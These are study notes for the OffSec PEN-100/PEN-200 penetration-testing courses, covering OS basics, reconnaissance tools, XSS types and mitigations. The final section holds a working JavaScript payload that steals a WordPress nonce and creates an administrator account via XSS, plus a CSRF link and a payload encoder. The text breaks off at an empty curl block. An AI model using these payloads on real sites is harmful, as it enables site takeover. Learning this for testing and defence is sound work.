- [Introduction to PEN-100](#introduction-to-pen-100)
  - [CIA Triad](#cia-triad)
  - [Other Design Principles](#other-design-principles)
- [Linux Basics](#linux-basics)
  - [User Account Details](#user-account-details)
    - [Tools to modify user accounts](#tools-to-modify-user-accounts)
  - [Permissions](#permissions)
  - [Logs](#logs)
  - [Disk Management](#disk-management)
- [Networking Fundamentals](#networking-fundamentals)
  - [Wireshark](#wireshark)
  - [Tcpdump](#tcpdump)
  - [Address Resolution Protocol (ARP)](#address-resolution-protocol-arp)
  - [DHCP](#dhcp)
  - [Routing Tables](#routing-tables)
  - [NAT and PAT](#nat-and-pat)
- [Windows Basics](#windows-basics)
  - [Directory Structure](#directory-structure)
  - [System Information](#system-information)
  - [SysInternals Overview and psinfo](#sysinternals-overview-and-psinfo)
  - [Access Controls](#access-controls)
  - [Local Accounts and Groups](#local-accounts-and-groups)
    - [Administrator](#administrator)
    - [Guest](#guest)
    - [SYSTEM](#system)
  - [User Account Control (UAC)](#user-account-control-uac)
  - [`runas` and `cmd /c`](#runas-and-cmd-c)
  - [NTFS Permissions](#ntfs-permissions)
- [PEN-200](#pen-200)
  - [Risks, Threats, Vulnerabilities, and Exploits](#risks-threats-vulnerabilities-and-exploits)
  - [Passive Information gathering](#passive-information-gathering)
  - [Active Information Gathering](#active-information-gathering)
- [Nmap Scripting Engine (NSE)](#nmap-scripting-engine-nse)
  - [Overview](#overview)
  - [Usage](#usage)
  - [Creating Your Own Scripts](#creating-your-own-scripts)
- [Web application assessment tools](#web-application-assessment-tools)
- [Fingerprinting Web Servers with Nmap](#fingerprinting-web-servers-with-nmap)
  - [Overview](#overview-1)
  - [Basic Service Detection](#basic-service-detection)
  - [Using NSE Scripts](#using-nse-scripts)
  - [Advanced Fingerprinting](#advanced-fingerprinting)
- [Directory Brute Forcing Gobuster](#directory-brute-forcing-gobuster)
  - [Basic Usage](#basic-usage)
  - [Searching for Specific File Types](#searching-for-specific-file-types)
  - [Viewing Different Status Codes](#viewing-different-status-codes)
  - [Increasing Speed with Threads](#increasing-speed-with-threads)
  - [Specifying a User-Agent](#specifying-a-user-agent)
  - [Supplying Patterns for API enumeration](#supplying-patterns-for-api-enumeration)
- [Basic XSS and Testing](#basic-xss-and-testing)
  - [Javascript Refresher](#javascript-refresher)
  - [Types of XSS](#types-of-xss)
    - [1. Stored XSS (Persistent XSS)](#1-stored-xss-persistent-xss)
    - [2. Reflected XSS (Non-Persistent XSS)](#2-reflected-xss-non-persistent-xss)
    - [3. DOM-Based XSS](#3-dom-based-xss)
  - [Intermediate XSS Techniques](#intermediate-xss-techniques)
  - [Identifying XSS Vulns](#identifying-xss-vulns)
    - [Examples](#examples)
  - [Mitigation](#mitigation)
  - [Priv Esc via XSS](#priv-esc-via-xss)

## Introduction to PEN-100

### CIA Triad

* Confidentiality
  When the only people that can access it are the people explicitly permitted to access it. A person's social media account credentials are considered confidential as long as the user's password is known only to the owner.
  + Examples are network eavesdropping and credential stuffing

* Integrity
  When the information and functionality it stores is only that which the owner intends to be stored. In the above example, merely logging on to a user's social media account by guessing their password is not an attack against integrity. However, if the hacker starts to post messages or delete information, this would become such an attack
  + Example is arbitrary code execution

* Availability
  When the people who are supposed to access it can do so. Again, let's consider the above scenario. An attacker has gained access to a social media account and posted some content of their choosing. If the attacker changes the user's password and prevents them from logging on, this would now also be an attack against availability
  + Example is DoS

### Other Design Principles

* https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/follow-good-principles.html
* https://blog.threatpress.com/security-design-principles-owasp/

## Linux Basics

The FHS defines the purpose of each main directory on a Linux system. The top-level directories are described as follows.

* `/bin/`: basic programs

* `/boot/`: Linux kernel and other files required for its early boot process

* `/dev/`: device files

* `/etc/`: configuration files

* `/home/`: user's personal files

* `/lib/`: basic libraries

* `/media/`: mount points for removable devices (CD/DVD-ROM, USB keys, and so on)

* `/mnt/` or `/mount/`: temporary mount point

* `/opt/`: extra applications provided by third parties

* `/root/`: administrator's (root's) personal files

* `/run/`: volatile runtime data that does not persist across reboots (not yet included in the FHS)

* `/sbin/`: system programs

* `/srv/`: data used by servers hosted on this system

* `/tmp/`: temporary files (this directory is often emptied at boot)

* `/usr/`: applications (this directory is further subdivided into bin, sbin, lib according to the same logic as in the root directory) Furthermore,  `/usr/share/` contains architecture-independent data. The `/usr/local/` directory is meant to be used by the administrator for installing applications manually without overwriting files handled by the packaging system (dpkg).

* `/var/`: variable data handled by services. This includes log files, queues, spools, and caches.

* `/proc/` and `/sys/` are specific to the Linux kernel (and not part of the FHS). They are used by the kernel for exporting data to user space.

### User Account Details

Information about user accounts lives in the `/etc/passwd` file. Fingerprints of passwords are stored in `/etc/shadow` . 
The latter file can only be accessed with elevated privileges.

Entries in `/etc/shadow` are comprised of a fromat containing things like username, encrypted password, and some details about the password.

Entries in `/etc/passwd` are also formatted in the same way, colon separated with username, UID, GID, comment field, home directory, and default shell.

#### Tools to modify user accounts

* `usermod -L username` and `passwd -l username` commands both place an exclamation mark (!) at the beginning of the password hash in `/etc/shadow`. This change can be manually applied to the file as well. The result is that any password authentication attempt will fail for the given user.
* When an account expiration date is set, it is stored in the 8th field within `/etc/shadow`. We can use the chage command by providing the `-E` switch to set an expiration date for a user account. The easiest way to expire an account is to provide a date in the past.
* A third method is to change the default shell in `/etc/passwd` either to `/bin/false`, which will exit immediately, or to `/sbin/nologin`, which is a simple program that displays a message saying that the account is currently not available. We can use the `usermod` command with the `-s` option to change the default shell of a user.

We can also use `passwd --status jane` or `chage -l jane` to check user details.

### Permissions

The second way to represent rights is via an octal numeric representation. It associates each right with a value.

* 4 for read

* 2 for write

* 1 for execute

* 0 for no permissions

We associate each combination of rights with the sum of the three figures.

* 7 = 4 + 2 + 1 = read, write, and execute

* 6 = 4 + 2 = read and write

* 5 = 4 + 1 = read and execute

* 3 = 2 + 1 = write and execute

Aside from the rwx permissions described above, two additional special rights pertain to executable files: setuid and setgid. These are symbolized with the letter "s".

If these two rights are set, either an uppercase or lowercase "s" will appear in the permissions. This allows the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid).

It's important to note a few things here. The first is that many files will have root as the owner of the file. If the setuid attribute is assigned to an executable, that program will run under the super-user identity. This means that any user who manages to subvert a setuid root program to call a command of their choice can effectively impersonate the root user and have all rights on the system. Penetration testers regularly search for these types of files when they gain access to a system as a way of escalating their privileges.

https://www.cbtnuggets.com/blog/technology/system-admin/linux-file-permissions-understanding-setuid-setgid-and-the-sticky-bit

### Logs

Most logs in `/var/log` with standard structure. Some others have sotre info with a special structure.

`/var/log/wtmp` has a special structure. It keeps arecord about all login, logout and runlevel change events. The file can be processed by the `last` and `who` commands, for example.

```shell
kali@kali:~$ who /var/log/wtmp | tail -5 
robert   tty7         2021-07-03 09:46 (:0)
nichole  tty7         2021-07-03 11:53 (:0)
kali     tty7         2021-07-06 08:04 (:0)
robert   tty7         2021-07-06 15:09 (:0)
kali     tty7         2021-07-07 14:03 (:0)
```

The above shows several users logged in to the machine for several days.

Can view kernal logs with `dmesg` . These evetns are generated by the kernal emitting messages that it stores in a ring buffer whenever something interesting happens.

`systemd` also stores multiple logs that can be viewed with `journalctl` . Running `journalctl` by itself with dump all available logs chronologically. `-u` option can be used to display logs from a specific systemd unit. For example `journalctl -u ssh.service` .

Info on run levels here: https://www.geeksforgeeks.org/run-levels-linux/

### Disk Management

The most prevalent tools to interact with disks and filesystems are `free` , `dd` , `du` , `df` , and `mount` .

`free` - information on memory
`df` - "disk free" reports on available space
`dd` - mostly used to raw copy a device file on a block level
`du` - can be used to determine the size of files and directories. The -hs option is typically used to make the output more human readable.
`df` (with `-T` ) - used to show the type of filesystem

`mount` can be used to mounta filesystem

`fdisk` with sudo is used to find information about say, a USB drive that has been mounted.

## Networking Fundamentals

### Wireshark

TLS can help prevent packets loaded into wireshark.

Following TCP streams is useful, and exporting objects from different layers. 

### Tcpdump

Using the `Loopback` interface allows us to run network services without exposing to the internet.

### Address Resolution Protocol (ARP)

Designed to associate Network Layer addresses to Link Layer addresses. In this case, we're concerned with IP addresses and MAC addresses. This allows switches to transmit Ethernet frames to their intended destination devices on a Local Area Network (LAN).

ARP allows machines to communicate by specifying rules that they can follow to learn which IP address belongs to each MAC address.

### DHCP

Computer joins network -> Asks if there are any DHCP servers available (DHCP Discover) -> DHCP server responds with offer of available IP address -> Computer responds with DHCP Request "sure, thanks" -> Server responds with DHCP ACK. This assigns the IP address and it tells the computer the network's subnet mask, its default gateway address, and its Domain Name Server (DNS) address(es). It also tells the computer how long it has the IP address before needing to revalidate.

### Routing Tables

Routing tables help a machine to determine how it can send information to other hosts. And even hosts it doesn't have a direction network connection with.

A routing table is simply a table of rows and columns that contain important info about the next hops on the network. It aims to use the least amount of hops possible.

2 types of routes: static and dynamic. Static routes are simply hardcoded addresses, whereas dynamic routes are learned by a machine or router through some networking protocol (like DHCP).

Using the `route` command, we can see a machines routing tables.

### NAT and PAT

NAT creates one to many map between private IP address and public IP addresses. 

In simple terms, NAT works by assigning each device on a local network a unique private IP address. When these devices access the internet, the router replaces their private IP address with its own public IP address. This allows the devices on the local network to communicate with the internet, but prevents them from being directly accessible from the internet.

PAT does basically the same but with ports.

## Windows Basics

WMIC (Windows Management Instrumentation Command-Line) utility provides a command-line interface for Windows Management Instrucmentation. Allows scripting langauges like VBScript and Powershell to manage win systems locally and remotely. Also allows sharing of info between management apps. 

Instead of `man` use `help` before a command. Can also append `/?` to get info on how to use the command. 

can use `dir /A` to display hidden files. similar to `ls -la`

### Directory Structure

Outline here: https://en.wikipedia.org/wiki/Directory_structure

### System Information

`systeminfo` provides information about the system.

Environment variables can be accessed by wrapping them in percentage signs like `%<VARIABLE-NAME>%` .

can use `set` to see all env vars and to temporarily change the value of an env var in the context of the current shell. `setx` to change permanently in the registry.

### SysInternals Overview and psinfo

The psinfo tool is quite versatile, and can retrieve information related to security, installed software, system patches, disk volume, and more. It can even be used on a remote machine. We leave it as an exercise to determine how to work with it further. Remember to use /? if you get stuck.

Psinfo is not the only tool that can pull this info. It can be done with PowerShell and wmic.

### Access Controls

Base command to create and manage users on Windows is called `net` . Can manage users and `localgroup` . A `localgroup` is a set of accounts that
can be assigned permissions on a local machine.

```powershell
C:\>net localgroup

Aliases for \\Offsec-Machine

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.
```

```powershell
C:\>net localgroup Administrators Tristan /add
The command completed successfully.
```

```powershell
C:\>net localgroup Administrators Tristan /del
The command completed successfully.

C:\>net user /del Tristan
The command completed successfully.
```

Can also use `net accounts` to display or set account policies.

Security principals 
* Subject that the os can opt to (or not to) authenticate. Applied to all accounts, threads, processes, gorups of users, and even parts of the OS.
* Identified by SIDs (security identifiers); alphanumeric codes that identify principals on machines
* Some SIDs are well-known, like S-1-1-0, which is the Everyone group. Includes all users on the machine

### Local Accounts and Groups

#### Administrator

User account designed for the system admin to manage the machine. SID is always *S-15-domain-500*.

Desired target during pen tests for obvious reasons

Disabled by default on Win 10. Other admin account will be provisioned and assigned permissions through the Local Administrators group

#### Guest

Let's non users log in with restricted perms. Belongs to Guest group with SID *S-1-5-32-546*.
By default, it's disabled, but can be enabled with a blank password.

#### SYSTEM

Used by the Os to run services that need elevated perms. Not to be logged in by users. Same perms as the Admin account.
Some exploits allow us to xecute code in context of its owner. 
If a process running as SYSTEM get exploited, we might be able to impersonate this account.

### User Account Control (UAC)

Attempts to prevent malicious actions by forcing an active human or user to manually confirm administrative actions 
by means of a prompt or message box.

Least-priv. If an attacker triggers UAC with a malicious action, the active user will likely become aware of the attempt.
Strong attackers have a good model of what actions can trigger UAC, so that they can better avoid it.

### `runas` and `cmd /c`

Impersonate another user with `runas` . Can also invoke cmd.exe binary itself, say, via remote code execution.

Note: `runas` is best used with a GUI since it executes the desired command under a different conext than the shell that starts it. 

`runas /user:<username> cmd` to spawn a new shell as that user.

Sidenote: can use `rdesktop` to remotely connect via RDP. syntax is typically `rdesktop -u <username> -p <password> <target_IP>`

### NTFS Permissions

ACE - represents a particular permission
ACL - list of permissions

Assignable to files:
* Read: Allows the user to view the contents of the file. Crucially, read also allows users to execute scripts.

* Write: Allows the user to write to the file. Note that write does not allow a user to delete the file, though they can delete its contents.

* Read & Execute: Allows the user to read the file, as well as execute binaries.

* Modify: Allows the user to read and write to the file. Also allows the user to delete it.

* Full Control: Allows the user to read, write, change, or delete the file.

* Here is the basic set of permissions assignable to directories.

* Read: Allows the user to view and list any file in the directory.

* Write: Allows the user to add files or subfolders to the directory.

* Read & Execute: Allows the user to view and list any file or subfolder in the directory, and also allows execution of any binary within the folder.

* List Folder Contents: Allows the user to list any file or subfolder in the directory and also allows execution of any binary within the folder. _List Folder Contents_ appears at first glance very similar to Read & Execute. The difference between them is that Read & Execute allows for viewing the contents of files as well.

* Modify: Allows the user to read, write and delete files and subfolders within the directory.

* Full Control: Allows the user to read, write, change, and delete files and subfolders within the directory. Note that the Full Control permission on a directory allows the user to delete all files in it, even if they aren't assigned Modify or Full Control permissions on the files themselves.

Moar here, along with special permissions: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)?redirectedfrom=MSDN

Inheritance allows a parent entity to propogate attributes to its children. Things contained within a folder inherit the permissions of the folder.

`icacls` tool is a builtin exectuable that can display and modify permissions on files and folders.

Here are some of the common options we might be interested in:
* /T executes the operation recursively on all subfolders

* /C forces the operation to continue despite any errors

* /L is used with symbolic links. It causes the operation to be executed on the link itself rather than its target.

Example:

```powershell
c:\>icacls Music /grant Susan:(OI)(CI)(F)
processed file: Folder
Successfully processed 1 files; Failed processing 0 files

c:>icacls Music /t /c
Music NT AUTHORITY\SYSTEM:(OI)(CI)(F)
      BUILTIN\Administrators:(OI)(CI)(F)
      Offsec-Machine\Offsec:(OI)(CI)(F)
      Offsec-Machine\Susan:(OI)(CI)(F)

Music\RockAndRoll NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                  BUILTIN\Administrators:(OI)(CI)(F)
                  Offsec-Machine\Offsec:(OI)(CI)(F)
                  Offsec-Machine\Susan:(OI)(CI)(F)
...
```
`/t` option to check that the assigned permissions have been propogated to the children of the dir
\

## PEN-200

https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html

https://www.offsec.com/offsec/what-it-means-to-try-harder/

### Risks, Threats, Vulnerabilities, and Exploits

Risk is based on probability and impact, and is divided into four quadrants:

1. Low probability, low impact events
2. Low probability, high impact events
3. High probability, low impact events
4. High probability, high impact events

Threats are anything that poses a risk to an asset we care about. 

For a threat to become an actual risk, the target being threatened must be vulnerable in some manner. A vuln is a flaw that allow a threat to cause harm.

Attack surface is all of the endpoints or assets or components of a system that could be vulnerable to exploitation.

### Passive Information gathering

* Whois enumeration
* Google Dorking: https://www.exploit-db.com/google-hacking-database
* Netcraft: https://searchdns.netcraft.com/ and https://sitereport.netcraft.com/, etc.
* Open-source code: reconnaisance on github for sensitive data
* Shodan: crawls the web for internetconnected devices
* Security Headers and SSL/TLS - https://securityheaders.com, https://ssllabs.com/ssltest

### Active Information Gathering

* DNS Enumration: lucrative for information gathering
  * `host www.site.com`
  * `host -t mx site.com` - mail servers
  * `host -t txt site.com` - txt records

## Nmap Scripting Engine (NSE)

### Overview

- NSE is used to automate certain tasks that Nmap performs, such as host discovery, port scanning, version detection, and more.
- NSE scripts are written in the Lua programming language.
- As of September 2021, Nmap comes with over 600 pre-written NSE scripts, addressing a wide range of functionality.
- NSE scripts can be categorized into several categories: default, discovery, safe, intrusive, vuln, exploit, auth, broadcast, brute, dos, external, fuzzer, malware, version, and more.

### Usage

- To run a specific NSE script, you can use the `--script` option followed by the script name, like this: `nmap --script <script-name> <target>`
- For example, to run the `vuln` script against a target, you would use: `nmap --script vuln <target>`
- You can also use wildcards and categories with the `--script` option. For example, `nmap --script "http-*" <target>` will run all scripts whose names start with "http-", and `nmap --script vuln <target>` will run all scripts in the "vuln" category.
- Some scripts require arguments, which can be passed with the `--script-args` option. For example, `nmap --script http-brute --script-args userdb=users.txt,passdb=pass.txt <target>` will run the `http-brute` script with the specified user and password databases.

### Creating Your Own Scripts

- To write your own NSE scripts, you need to know the basics of Lua and Nmap's NSE libraries.
- An NSE script consists of several parts:
  - A rule function that determines when the script should be run. The three types of rule functions are `prerule`, `hostrule`, and `portrule`.
  - An action function that performs the main task of the script.
  - A description that includes metadata about the script.
- Nmap provides several NSE libraries to help with script development. These libraries include functionality for networking, string manipulation, data handling, and more.

## Web application assessment tools


## Fingerprinting Web Servers with Nmap

### Overview

Web server fingerprinting is the process of determining the type and version of a web server (software and sometimes hardware) running on a target system. Nmap can be used for this purpose using its service detection and NSE scripts.

### Basic Service Detection

- Nmap's `-sV` option is used to enable version detection, which can help identify the web server software and its version. 
  - Example: `nmap -sV <target>`

### Using NSE Scripts

- Nmap's Scripting Engine (NSE) has scripts specifically for web server fingerprinting. 
- `http-enum` script can be used to enumerate directories used by popular web applications and servers.
  - Example: `nmap --script http-enum <target>`
- `http-server-header` script returns the HTTP server header of the web server.
  - Example: `nmap --script http-server-header <target>`

### Advanced Fingerprinting

- For a more granular fingerprinting, you can use the `http-waf-detect` and `http-waf-fingerprint` scripts to identify the presence of software Web Application Firewall (WAF) and its type.
  - Example: `nmap --script http-waf-detect --script http-waf-fingerprint <target>`

## Directory Brute Forcing Gobuster

Gobuster is a powerful tool used for brute-forcing URIs (directories and files) in web sites, DNS subdomains, and even virtual host names on target web servers. 

### Basic Usage

The basic command for directory brute forcing with Gobuster is `gobuster dir -u http://targetwebsite.com -w /path/to/wordlist`

In this command:
- `-u` specifies the URL of the target.
- `-w` specifies the path to the wordlist that Gobuster will use to brute force directories.

### Searching for Specific File Types

If you're looking for specific file types, you can use the `-x` option followed by the file extensions you want to search for, separated by commas. 

`gobuster dir -u http://targetwebsite.com -w /path/to/wordlist -x txt,php,html`

### Viewing Different Status Codes

By default, Gobuster will only show directories that return a 200 status code. If you want to see directories that return other status codes, you can use the `-s` option followed by the status codes you're interested in.

`gobuster dir -u http://targetwebsite.com -w /path/to/wordlist -s '200,204,301,302,307,401,403'`

### Increasing Speed with Threads

You can increase the speed of Gobuster by increasing the number of threads with the `-t` option.

`gobuster dir -u http://targetwebsite.com -w /path/to/wordlist -t 50`

### Specifying a User-Agent

Some websites may block default user-agents, and in this case, you can use the `-a` option to specify a different user-agent.

`gobuster dir -u http://targetwebsite.com -w /path/to/wordlist -a 'Mozilla/5.0'`

### Supplying Patterns for API enumeration

```
# in a file called pattern

{GOBUSTER}/v1
{GOBUSTER}/v2
```

`gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`

## Basic XSS and Testing

Cross-Site Scripting (XSS) is a type of injection security vulnerability typically found in web applications. XSS allows attackers to inject malicious scripts into webpages viewed by other users.

Basically if inputs are not sanitized, they be vulnerable to XSS.

### Javascript Refresher

When a browser recieves a response from a server with a page that contains HTML, the borwser creates a [DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) tree which contains all forms, inputs, images, etc. related to the web page.

Javascript acts the middle man to access and modify the page's DOM which allows for an interactive user experience.

More on DOM:

- OM: The Document Object Model (DOM) is a programming interface for web documents. It represents a webpage as a tree structure of objects that can be manipulated using JavaScript.

- DOM Tree Structure: The webpage is represented as a tree, with the Document node at the top. Each node represents a part of the document (elements, attributes, or text).

- Nodes & Elements: Every item in the DOM is a node, and these nodes include elements, which represent HTML elements such as <p>, <div>, <img>, etc.

- DOM Manipulation: JavaScript can interact with and modify the DOM. This allows dynamic updates to the content, structure, and style of a webpage.

- Event Handling: The DOM allows for the handling of user events, such as clicks or keyboard input. JavaScript can define responses to these events.

- Traversal: This refers to moving around the DOM tree, accessing and selecting different nodes based on their relationships (like parent, child, or sibling nodes).

- DOM Methods: These are JavaScript functions used to interact with the DOM, such as getElementById(), getElementsByTagName(), createElement(), appendChild(), etc.

From an attackers perspective, if we can inject Javascript code into the application, we could potentially modify the page's DOM. with access to the DOM, we can redirect login forms, extract password, and steal session cookies. 

### Types of XSS

There are mainly three types of XSS:

#### 1. Stored XSS (Persistent XSS)

- This type of XSS vulnerability occurs when the data provided by the attacker is saved by the server and then permanently displayed on "normal" pages returned to users. 
- For example, a comment on a blog post or a message on a forum that contains malicious script.

```html
<p>Check out this cool link: <a href="#" onmouseover="javascript:alert('XSS')">Click me!</a></p>
```

If the server doesn't properly sanitize this input, the malicious JavaScript code will be stored on the server. When other users view this message, the JavaScript code will be executed in their browsers.

#### 2. Reflected XSS (Non-Persistent XSS)

- Reflected XSS occurs when the malicious script is part of the victim's request to the website. The website then includes this malicious script from the request in the response. 
- A common example of this is in error messages, search engines, or any other response that includes some or all of the input sent to the server as part of the request.

```html
http://example.com/search?query=<script>alert('XSS')</script>
```

If the server includes the query parameter value in the search results page without sanitizing it, the JavaScript code will be executed in the user's browser.

#### 3. DOM-Based XSS

- DOM-based XSS occurs when the client-side script of a web application writes user input to the Document Object Model (DOM). The web browser then executes the script, leading to an XSS vulnerability.

Testing for XSS vulnerabilities involves providing input that attempts to invoke JavaScript code. The simplest example is attempting to inject a script tag: `<script>alert('XSS')</script>`


```html
http://example.com/#<img src=x onerror=alert('XSS')>
```

In this case, if the page uses the fragment identifier (after the #) in its JavaScript code without sanitizing it, the JavaScript code will be executed in the user's browser.

Each of these examples is designed to execute a simple alert function, but in a real attack, the JavaScript code could do much more harmful things, such as stealing cookies or other sensitive information.

### Intermediate XSS Techniques

- Using different event handlers such as `onmouseover`, `onload`, `onerror` etc. to trigger the payload.
- Using encoding to bypass filters, like URL encoding, HTML entity encoding, etc.
- Using less common HTML tags that can contain JavaScript, such as `img`, `link`, `div`, `body`, `input`, `textarea`, `form`, `frameset`, `iframe`, etc.

### Identifying XSS Vulns

Idenityfing input fields such as search fields that accept sanitized input, which is then displayed as output in subsequent pages.

Once we identify an entry point, we can input special chars and observe the output ot determine if any of the special chars return unfiltered.

Most common special chars are: `< > ' " { } ;`

- `< >` denote elements which are the various components that make up an HTML doc
- `{ }` denote JS function declaration
- `'` and `"` denote strings
- `;` denote the end of a statement

If the app doesn't sanitize (remove or encode) these, the app interprets these chars as code, which in turn enables additional code. **Encoding helps to prevent the above characters from being used to execute code**.

Most common encodings we will encounter are HTML encoding and URL encoding.
- URL encoding (also called percent encoding) is used to convert non-ASCII and reserved characters in URLs, such as converting a space to `%20`
- HTML encoding (also called character references) `<` becomes `&lt;` and `>` becomes `&gt;`, which are displayed on the page as the literal characters `<` and `>`, not as HTML tags. 

#### Examples

1. Directly Inserting User Input into HTML:

Vulnerable code:

```javascript
Copy code
var user_input = document.getElementById('user_input').value;
document.getElementById('output').innerHTML = user_input;
```

In this case, the user input is directly inserted into the HTML of the page. If the user input were something like `<script>malicious code here</script>`, that code would be executed.


Safer code:

```javascript
Copy code
var user_input = document.getElementById('user_input').value;
document.getElementById('output').innerText = user_input;
```

Here, by using `innerText` instead of `innerHTML`, the browser treats the user input as literal text, not HTML or JavaScript code.


2. Not Escaping Special Characters in User Input:

Vulnerable code:

```javascript
Copy code
var user_input = document.getElementById('user_input').value;
var element = `<div>${user_input}</div>`;
document.body.innerHTML = element;
```
In this case, the user input is inserted into an HTML template. If the user input were something like `</div><script>malicious code here</script><div>`, that code would be executed.


Safer code:

```javascript
Copy code
var user_input = document.getElementById('user_input').value;
var textNode = document.createTextNode(user_input);
var element = document.createElement("div");
element.appendChild(textNode);
document.body.appendChild(element);
```

Here, instead of using a template string, a text node is created for the user input and appended to a new `div` element. This way, the user input is treated as plain text, not HTML or JavaScript code.

3. Using eval() with User Input:

Vulnerable code:

```javascript
Copy code
var user_input = document.getElementById('user_input').value;
eval(user_input);
```

The `eval()` function executes JavaScript code represented as a string. If user input is passed directly to `eval()`, an attacker could execute any JavaScript code they want.

Safer code:

Avoid using `eval()` if at all possible. If you need to convert a string representation of an object into an actual object, consider using `JSON.parse()` instead (assuming the string is formatted as valid JSON).


### Mitigation

- Input validation: Ensure that input is what you expect. For example, a field expecting a number doesn't need to accept letters or special characters.
- Output encoding: Whenever output is generated dynamically and includes some form of user input, ensure it's properly encoded.
- Use security headers: For example, the Content Security Policy (CSP) header can significantly reduce the risk of XSS attacks.
- Use HttpOnly cookies: This attribute can prevent access to cookie values via JavaScript.

### Priv Esc via XSS

We could leverage our XSS to steal cookies1 and session information if the application uses an insecure session management configuration. If we can steal an authenticated user's cookie, we could masquerade as that user within the target web site.

For instance, we could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes.

In order to succeed with our attack angle, we need to cover another web application attack class.

To develop this attack, we'll build a similar scenario as depicted by Shift8.5 First, we'll create a JS function that fetches the WordPress admin nonce.6

The nonce is a server-generated token that is included in each HTTP request to add randomness and prevent Cross-Site-Request-Forgery (CSRF)7 attacks.

A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.

The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.

```html
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
```

To gather a nonce we could do something like this:

```javascript
// Create a new XMLHttpRequest object for making HTTP requests from JavaScript
var ajaxRequest = new XMLHttpRequest();

// Define the URL for the HTTP request. In this case, we're targeting the WordPress admin page for creating a new user
var requestURL = "/wp-admin/user-new.php";

// Create a regular expression that matches a certain pattern in the response text.
// This pattern is looking for the `ser" value` attribute which typically holds the nonce (number used once) value in WordPress admin forms
var nonceRegex = /ser" value="([^"]*?)"/g;

// Initialize a request. This is using "GET" as the method, the previously defined URL, and false for synchronous request
ajaxRequest.open("GET", requestURL, false);

// Send the request to the server
ajaxRequest.send();

// Use the regular expression to find a match in the response text from the server
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);

// If a match was found, it will be in the first index of the match array. This is the nonce value.
var nonce = nonceMatch[1];

```

This function performs a new HTTP request towards the /wp-admin/user-new.php URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string _/ser" value="_ and double quotes.

Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.

```javascript
// This is a string of parameters to be sent in the body of the POST request.
// The parameters include various details like the action to be taken ('createuser'), 
// the nonce value obtained from the previous block of code, and the details of the new user to be created.
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";

// Create a new XMLHttpRequest object for making HTTP requests from JavaScript.
ajaxRequest = new XMLHttpRequest();

// Initialize a request with "POST" as the method, the previously defined URL, and true for asynchronous request.
ajaxRequest.open("POST", requestURL, true);

// Set the content type of the HTTP request to 'application/x-www-form-urlencoded' which is standard for POST requests that are submitting form data.
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// Send the request to the server with the parameters defined earlier.
ajaxRequest.send(params);

```

In essence, this script is constructing and sending a POST request to create a new user on a WordPress site. The params variable contains the data necessary for creating a new user, including the user's login name, email, password, and role. The nonce that was obtained from the previous block of code is also included in the parameters to bypass the security measure protecting the form.

To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it. Use something like JS Compress.

To encode:

```javascript
// This function takes a string as input and returns a string of numbers
// where each number is the ASCII code of the corresponding character in the input string.
function encode_to_javascript(string) {
    var input = string
    var output = '';

    // The for loop goes through each character in the input string.
    for(pos = 0; pos < input.length; pos++) {
        // The charCodeAt() method returns the ASCII code of the character at the specified index in the string.
        // This code is added to the output string.
        output += input.charCodeAt(pos);

        // If the current character is not the last character in the string, a comma is added to the output string.
        // This is to separate the ASCII codes in the output.
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }

    // The function returns the output string, which is a comma-separated list of ASCII codes representing the input string.
    return output;
}

// The function is called with the string 'insert_minified_javascript' as the argument.
let encoded = encode_to_javascript('insert_minified_javascript')

// The result is printed to the console.
console.log(encoded)
```

We would use this function in the browser console.

Once we have copied the encoded string, we can insert it with the following curl command and launch the attack:

```bash
